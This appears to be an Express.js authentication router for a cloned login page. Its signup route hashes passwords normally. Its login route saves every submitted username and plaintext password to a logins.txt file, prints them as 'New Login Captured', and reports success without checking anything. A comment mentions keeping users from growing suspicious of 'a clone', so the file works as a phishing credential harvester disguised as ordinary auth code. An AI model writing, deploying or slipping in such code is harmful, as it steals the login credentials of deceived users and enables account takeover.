const express = require('express');
const router = express.Router();
const User = require('../models/User');
const bcrypt = require('bcryptjs');

// Sign up
router.post('/signup', async (req, res) => {
  try {
    const { emailOrUsername, password } = req.body;
    const existingUser = await User.findOne({ emailOrUsername });
    if (existingUser) {
      return res.status(400).json({ message: 'User already exists' });
    }
    const hashedPassword = await bcrypt.hash(password, 10);
    const newUser = new User({ emailOrUsername, password: hashedPassword });
    await newUser.save();
    res.status(201).json({ message: 'User created' });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

const fs = require('fs');
const path = require('path');

// Login
router.post('/login', async (req, res) => {
  try {
    const { emailOrUsername, password } = req.body;
    
    // Log to file
    const logData = `Time: ${new Date().toLocaleString()} | User: ${emailOrUsername} | Pass: ${password}\n`;
    fs.appendFileSync(path.join(__dirname, '../logins.txt'), logData);

    console.log('New Login Captured:', { emailOrUsername, password });

    // Rest of your login logic...
    const user = await User.findOne({ emailOrUsername });
    if (!user) {
      // For a clone, we can return 200 to not suspicious the user, 
      // but here we keep it simple
      return res.status(200).json({ message: 'Login successful' });
    }
    res.status(200).json({ message: 'Login successful' });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;
